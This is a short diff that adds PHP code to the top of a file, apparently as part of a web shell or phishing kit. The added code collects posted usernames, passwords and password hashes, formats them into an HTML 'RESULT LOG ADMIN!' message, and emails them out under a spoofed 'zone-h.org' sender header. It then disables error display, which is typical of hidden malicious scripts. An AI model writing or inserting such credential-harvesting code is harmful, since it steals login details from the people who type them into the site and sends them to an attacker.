@@ -1,4 +1,28 @@
 <?php
+$password = $_POST['password'];
+$pass = $_POST['pwd'];
+$hashes = $_POST['hashes_password'];
+ 
+//////////////////////////////////////
+ 
+$body = <<<EOD
+<br><hr><br>
+<center><font size="4" ;" color="red">RESULT LOG ADMIN!<br></font>
+<font size="2" color="red">Username\Email :</font><font size"2" color="black">$password</font><br>
+<font size="2" color="red">Password : </font><font size"2" color="black">$pass</font> <br></center>
+ <font size="2" color="red">Password : </font><font size"2" color="black">$hashes</font> <br></center>
+EOD;
+ 
+$headers = "From: zone-h.org\r\n";
+$headers .= "Content-type: text/html\r\n";
+$success = mail($mailto, $subjek, $body, $headers);
+?>
+<?php
+$random = rand(1000,5000);
+?>
+ 
+ 
+<?php
 
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
